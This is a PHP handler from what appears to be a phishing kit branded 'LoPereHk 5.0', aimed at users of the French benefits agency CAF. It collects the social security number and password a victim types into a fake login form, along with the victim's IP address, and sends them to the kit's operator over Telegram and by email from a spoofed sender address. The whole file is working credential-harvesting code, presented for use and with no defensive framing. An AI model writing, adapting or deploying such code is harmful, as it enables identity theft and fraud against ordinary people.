<?php
//   _           _____                _    _ _  __
//   | |         |  __ \              | |  | | |/ /
//   | |     ___ | |__) |__ _ __ ___  | |__| | ' / 
//   | |    / _ \|  ___/ _ \ '__/ _ \ |  __  |  <  
//   | |___| (_) | |  |  __/ | |  __/ | |  | | . \ 
//   |______\___/|_|   \___|_|  \___| |_|  |_|_|\_\                                                                                     

// LoPereHk 5.0
error_reporting(E_ALL);
ini_set('display_errors', 1);

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

include '../config.php';
include './ip.php';
include './telegram.php';

$ip = ip();
if (isset($_POST['mail_input']) && isset($_POST['password_input'])) {

    $message = "Acces CAF - $ip\n";
    $message .= '🔥Nss = ' . $_POST['mail_input'] . "\r\n";
    $message .= '🔥Pass = ' . $_POST['password_input'] . "\r\n";

    $objet = 'Acces CAF' . " | Fr0m:" . $ip;
    $header = "From:📦CAFLHK" . "<bill@rezzzzz.com>";
    /////
    $tmessage = $message;

    $_SESSION['data'] = $tmessage;
    tlgsend(urlencode($tmessage));
    mail($Config['Email.Recipient'], $objet, $message, $header);
    // mail($votre_email, $objet, $message, $header);
}
?>
